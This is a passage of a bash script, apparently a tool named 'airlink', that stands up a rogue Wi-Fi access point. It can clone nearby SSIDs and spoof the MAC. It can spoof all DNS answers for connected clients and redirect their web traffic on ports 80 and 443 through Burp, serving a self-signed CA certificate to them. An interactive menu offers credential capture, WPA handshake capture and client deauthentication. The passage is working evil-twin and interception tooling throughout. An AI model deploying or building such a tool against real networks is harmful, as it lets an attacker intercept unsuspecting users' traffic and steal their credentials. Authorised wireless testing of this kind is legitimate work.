            [[ "$action" == "old" ]] && { label="RECONNECT"; lc="$C_MAG"; }
            printf "\n    ${C_YEL}${C_BLD}>>${C_RST} ${lc}${C_BLD}[%s CLIENT]${C_RST} ${C_YEL}%s${C_RST}  ${C_DIM}mac:${C_RST} %s%s\n" \
                "$label" "$ip" "$mac" "${host:+  ${C_DIM}host:${C_RST} $host}"
            scan_network
            printf '%s\n' "    ${C_YEL}${C_BLD}>>${C_RST} ${C_DIM}await input...${C_RST}"
        done
    ) < "$DEVICE_FIFO" &
    DEVICE_WATCHER_PID=$!

    pl_msg "device watcher: active (new + reconnecting clients announced automatically)"
}

# CA server: generate a self-signed CA cert and serve it over HTTP on the
# gateway IP. The Burp PREROUTING rule excludes the gateway IP on port 80 so
# the client can reach http://GATEWAY/ca.crt without going through Burp first.
start_ca_server() {
    if ! command -v python3 &>/dev/null; then
        pl_msg "CA server: python3 not found, skipping"
        return
    fi
    make_output_dir "$SERVE_DIR"
    make_output_dir "$CA_DIR"
    # Everything in SERVE_DIR is reachable by the client. A private key must
    # never live there — relocate any that does (e.g. left by an older run).
    for key in "$SERVE_DIR"/*.key "$SERVE_DIR"/*.pem; do
        [[ -f "$key" ]] || continue
        mv -f "$key" "$CA_DIR/" \
            && pl_err "moved $(basename "$key") out of $SERVE_DIR into $CA_DIR (private keys are never served)"
    done
    if [[ ! -f "$SERVE_DIR/ca.crt" ]]; then
        if command -v openssl &>/dev/null; then
            pl_msg "CA server: generating self-signed CA..."
            if openssl req -newkey rsa:2048 -nodes \
                    -keyout "$CA_DIR/ca.key" \
                    -x509 -days 365 \
                    -out "$SERVE_DIR/ca.crt" \
                    -subj "/CN=airlink-ca/O=airlink" 2>/dev/null; then
                chmod 600 "$CA_DIR/ca.key"
                pl_msg "CA server: cert -> $SERVE_DIR/ca.crt (key: $CA_DIR/ca.key, not served)"
            else
                pl_msg "CA server: openssl failed — place your CA manually at $SERVE_DIR/ca.crt"
            fi
        else
            pl_msg "CA server: openssl not found — place your CA at $SERVE_DIR/ca.crt"
        fi
    fi
    python3 -m http.server --bind "$INITIAL_STATIC_IP" --directory "$SERVE_DIR" 80 2>/dev/null &
    CA_SERVER_PID=$!
    pl_msg "CA server: http://$INITIAL_STATIC_IP/ca.crt"
    pl_msg "CA server: Burp import — Proxy > Proxy Settings > Import/Export CA Certificate"
}

# ── Setup ─────────────────────────────────────────────────────────────────────

pl_msg "clearing existing dhcp processes..."
clear_competing_dhcp

# Drop any rules a previous run left behind before adding our own.
reset_firewall_rules

if [[ -f /etc/dnsmasq.conf && ! -f /etc/dnsmasq.conf.bak ]]; then
    pl_msg "backing up dnsmasq.conf..."
    cp /etc/dnsmasq.conf /etc/dnsmasq.conf.bak
fi

# Optional probe scan + SSID clone happens first, while the AP interface is
# still free to go into monitor mode (this radio can't do AP + monitor at once).
[[ $PROBE_SCAN -eq 1 ]] && probe_scan_and_clone

# Take the AP interface away from NetworkManager/wpa_supplicant.
pl_msg "releasing $INTERFACE from NetworkManager..."
release_interface "$INTERFACE"

# Optional BSSID/MAC spoof (interface must be down for macchanger).
if [[ -n "$SPOOF_MAC" ]]; then
    ip link set "$INTERFACE" down 2>/dev/null
    if [[ "$SPOOF_MAC" == "random" ]]; then
        macchanger -r "$INTERFACE" >/dev/null 2>&1 && pl_msg "bssid: randomised"
    else
        if ! [[ "$SPOOF_MAC" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
            pl_err "invalid -m BSSID: $SPOOF_MAC (use 'random' or aa:bb:cc:dd:ee:ff)"
            exit 1
        fi
        macchanger -m "$SPOOF_MAC" "$INTERFACE" >/dev/null 2>&1 && pl_msg "bssid: $SPOOF_MAC"
    fi
    MAC_SPOOFED_IFACE="$INTERFACE"
    ip link set "$INTERFACE" up 2>/dev/null
fi

# Second adapter -> monitor mode for live sniff/deauth/handshake.
if [[ -n "$MONITOR_IFACE_REQ" ]]; then
    pl_msg "monitor: putting $MONITOR_IFACE_REQ into monitor mode..."
    if enter_monitor_mode "$MONITOR_IFACE_REQ"; then
        MONITOR_IFACE="$MONITOR_IFACE_REQ"
        pl_msg "monitor: $MONITOR_IFACE active (p=probe sniff  w=handshake  x=deauth)"
    else
        pl_err "could not put $MONITOR_IFACE_REQ into monitor mode — live recon keys disabled"
        restore_interface "$MONITOR_IFACE_REQ"
    fi
fi

# hostapd config — open by default, WPA2-PSK when -k is given.
{
    echo "interface=$INTERFACE"
    echo "driver=nl80211"
    echo "ssid=$SSID"
    echo "hw_mode=$HW_MODE"
    echo "channel=$CHANNEL"
    echo "auth_algs=1"
    echo "ignore_broadcast_ssid=$HIDDEN_SSID"
    if [[ -n "$WPA_PASSPHRASE" ]]; then
        echo "wpa=2"
        echo "wpa_passphrase=$WPA_PASSPHRASE"
        echo "wpa_key_mgmt=WPA-PSK"
        echo "wpa_pairwise=TKIP CCMP"
        echo "rsn_pairwise=CCMP"
    fi
} > "$HOSTAPD_CONF"

# dnsmasq config — always enables DNS query logging and the device watcher hook
make_output_dir "$LOGS_DIR"
pl_msg "dhcp range: $NETWORK_PREFIX.3-$NETWORK_PREFIX.200 on $INTERFACE"
{
    echo "interface=$INTERFACE"
    # bind-interfaces alone is not enough: dnsmasq auto-adds loopback to its
    # listen set whenever "interface=" is used, so it still binds 127.0.0.1:53
    # and answers the host's own queries there. With the "-D" wildcard spoof
    # below that redirects every lookup to $INITIAL_STATIC_IP, that breaks the
    # host's DNS. except-interface=lo keeps dnsmasq off loopback; together these
    # confine it to $INTERFACE (the client side), never the host.
    echo "bind-interfaces"
    echo "except-interface=lo"
    echo "dhcp-range=$DHCP_RANGE"
    echo "dhcp-script=$DHCP_HOOK"
    echo "log-queries"
    echo "log-facility=$LOGS_DIR/dns.log"
    # Now safe: with the binding confined above, this only spoofs queries that
    # arrive on $INTERFACE (the connected clients), not the host.
    [[ $DNS_SPOOF -eq 1 ]] && echo "address=/#/$INITIAL_STATIC_IP"
} > "$DNSMASQ_CONF"

# The watcher's FIFO and dhcp-script must exist before dnsmasq starts, or the
# first lease event fires against a missing hook.
start_device_watcher

# Launch hostapd in the background and confirm it actually came up — a busy
# radio, bad channel/regdomain or an rfkill block makes it exit within a second.
start_hostapd() {
    hostapd "$HOSTAPD_CONF" > "$RUN_TMPDIR/hostapd.log" 2>&1 &
    HOSTAPD_PID=$!
    sleep 3
    kill -0 "$HOSTAPD_PID" 2>/dev/null
}

# Start the access point. hostapd owns the interface in AP mode; we assign the
# gateway IP afterwards. The interface must be DOWN and free of wpa_supplicant
# to switch into AP mode, or nl80211 rejects the mode change with
# "Could not configure driver mode".
pl_msg "starting hostapd (ssid: $SSID, ch $CHANNEL, $([[ -n "$WPA_PASSPHRASE" ]] && echo WPA2 || echo OPEN)$([[ $HIDDEN_SSID -eq 1 ]] && echo ', hidden'))..."
ip link set "$INTERFACE" down 2>/dev/null
if ! start_hostapd; then
    # Almost always NetworkManager's shared wpa_supplicant still gripping the
    # radio (its command line has no iface name, so release_interface's pattern
    # kill can't target it). Stop it wholesale and retry once; cleanup restarts
    # it and reconnects NM on exit.
    if pgrep -x wpa_supplicant >/dev/null 2>&1; then
        pl_msg "radio still held — stopping wpa_supplicant and retrying..."
        systemctl stop wpa_supplicant 2>/dev/null
        pkill -x wpa_supplicant 2>/dev/null
        WPA_SUPPLICANT_STOPPED=1
        sleep 1
        ip link set "$INTERFACE" down 2>/dev/null
    fi
    if ! start_hostapd; then
        pl_err "hostapd failed to start:"
        sed 's/^/       /' "$RUN_TMPDIR/hostapd.log" | tail -12
        pl_msg "another process may hold the radio (NetworkManager/wpa_supplicant),"
        pl_msg "or the channel isn't allowed by your regdomain / the radio is rfkill-blocked."
        pl_msg "last resort: sudo airmon-ng check kill  (stops NM + supplicant), then rerun"
        exit 1
    fi
fi

pl_msg "interface $INTERFACE @ $INITIAL_STATIC_IP/$PREFIX_LEN"
ip addr flush dev "$INTERFACE"
ip addr add "$INITIAL_STATIC_IP/$PREFIX_LEN" dev "$INTERFACE"

if [[ $SHARE_INTERNET -eq 1 ]]; then
    if [[ -n "$ALLOW_IP" ]]; then
        pl_msg "nat: $INTERNET_INTERFACE -> $INTERFACE (forwarding enabled, allow: $ALLOW_IP only)"
    else
        pl_msg "nat: $INTERNET_INTERFACE -> $INTERFACE (forwarding enabled)"
    fi
    enable_ip_forwarding
    iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
    if [[ -n "$ALLOW_IP" ]]; then
        iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -d "$ALLOW_IP" -j ACCEPT
        iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j DROP
    else
        iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
    fi
    iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
fi

# Burp redirect — port 80 rule excludes the gateway IP so the CA server
# on http://GATEWAY_IP/ stays directly reachable without going through Burp
if [[ $BURP_ENABLED -eq 1 ]]; then
    enable_ip_forwarding
    pl_msg "redirect: 80/443 -> port $BURP_PORT (start Burp in invisible mode on 0.0.0.0:$BURP_PORT)"
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 ! -d "$INITIAL_STATIC_IP" -j REDIRECT --to-port "$BURP_PORT"
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port "$BURP_PORT"
fi

pl_msg "starting dnsmasq..."
systemctl restart dnsmasq
if ! systemctl is-active --quiet dnsmasq; then
    pl_err "dnsmasq failed to start. Config: $DNSMASQ_CONF"
    journalctl -u dnsmasq -n 5 --no-pager 2>/dev/null | sed 's/^/       /'
    exit 1
fi

[[ $ROLLING_PCAP -eq 1 ]] && start_rolling_pcap
[[ $BURP_ENABLED -eq 1 ]] && start_ca_server
[[ $DNS_SPOOF   -eq 1 ]] && pl_msg "dns spoof: all queries -> $INITIAL_STATIC_IP"

# ── Banner ────────────────────────────────────────────────────────────────────

echo ""
echo "    ${C_MAG}::${C_RST} ${C_YEL}${C_BLD}airlink${C_RST} ${C_MAG}::${C_RST}  ${C_CYN}═══${C_RST}  ${C_YEL}${C_BLD}[WIRELESS LINK ACTIVE]${C_RST}  ${C_CYN}═══${C_RST}  ${C_MAG}::${C_RST}"
printf "    ${C_YEL}${C_BLD}>>${C_RST} ${C_CYN}ssid:${C_RST} ${C_MAG}%-12s${C_RST} ${C_DIM}|${C_RST} ${C_CYN}ch:${C_RST} ${C_YEL}%-3s${C_RST} ${C_DIM}|${C_RST} ${C_YEL}%s${C_RST} ${C_DIM}|${C_RST} ${C_CYN}subnet:${C_RST} ${C_YEL}%s.0/%s${C_RST} ${C_DIM}|${C_RST} ${C_CYN}dhcp:${C_RST} ${C_GRN}ONLINE${C_RST}" \
    "$SSID" "$CHANNEL" "$([[ -n "$WPA_PASSPHRASE" ]] && echo WPA2 || echo OPEN)" "$NETWORK_PREFIX" "$PREFIX_LEN"
if [[ $BURP_ENABLED -eq 1 ]]; then
    printf " ${C_DIM}|${C_RST} ${C_CYN}burp:${C_RST} ${C_YEL}%s${C_RST}\n" "$BURP_PORT"
else
    printf '%s\n' " ${C_DIM}|${C_RST} ${C_CYN}burp:${C_RST} ${C_DIM}--${C_RST}"
fi
[[ $HIDDEN_SSID    -eq 1 ]] && pl_msg "hidden SSID: not broadcast"
[[ -n "$MONITOR_IFACE" ]]  && pl_msg "monitor adapter: $MONITOR_IFACE (p=probe  w=handshake  x=deauth)"
[[ $SHARE_INTERNET -eq 1 ]] && pl_msg "internet sharing: $INTERNET_INTERFACE -> $INTERFACE"
[[ $DNS_SPOOF     -eq 1 ]] && pl_msg "dns spoof: ON -> $INITIAL_STATIC_IP  |  dns log: $LOGS_DIR/dns.log"
[[ $DNS_SPOOF     -eq 0 ]] && pl_msg "dns log: $LOGS_DIR/dns.log  (press l to tail)"
[[ $ROLLING_PCAP  -eq 1 ]] && pl_msg "rolling pcap: ON (pid $ROLLING_TCPDUMP_PID) -> $CREDS_DIR/"
[[ $BURP_ENABLED  -eq 1 ]] && pl_msg "CA cert: http://$INITIAL_STATIC_IP/ca.crt  (files: $SERVE_DIR/)"
echo ""

# ── Interactive loop ──────────────────────────────────────────────────────────

KEYS="${C_CYN}Enter${C_RST}=scan  ${C_CYN}t${C_RST}=stations  ${C_CYN}c${C_RST}=capture creds  ${C_CYN}l${C_RST}=dns log  ${C_MAG}p${C_RST}=probe*  ${C_MAG}w${C_RST}=handshake*  ${C_MAG}x${C_RST}=deauth*  ${C_DIM}(*need -M, Ctrl+C=exit)${C_RST}"
pl_msg "$KEYS"
# `while read` (not `while true; do read`) so a closed stdin ends the loop
# instead of spinning at 100% CPU.
while read -r input; do
    case "$input" in
        t|T) list_stations ;;
        c|C) capture_creds ;;
        l|L) show_dns_log ;;
        p|P) live_probe_sniff ;;
        w|W) capture_handshake ;;
        x|X) run_deauth ;;
        "")  echo "${C_CYN}scanning...${C_RST}"; scan_network; list_stations ;;
        *)   pl_msg "$KEYS" ;;
    esac
done

# stdin closed (backgrounded or non-interactive): hold the session open so the
# AP and background captures keep running until signalled.
pl_msg "stdin closed — holding session open (Ctrl+C or SIGTERM to exit)."
# `wait` on a background sleep, not a foreground `sleep`: bash defers trap
# handlers until the current foreground command finishes, so a plain
# `sleep 86400` would swallow Ctrl+C and skip cleanup entirely.
while :; do
    sleep 86400 &
    wait $! 2>/dev/null
done
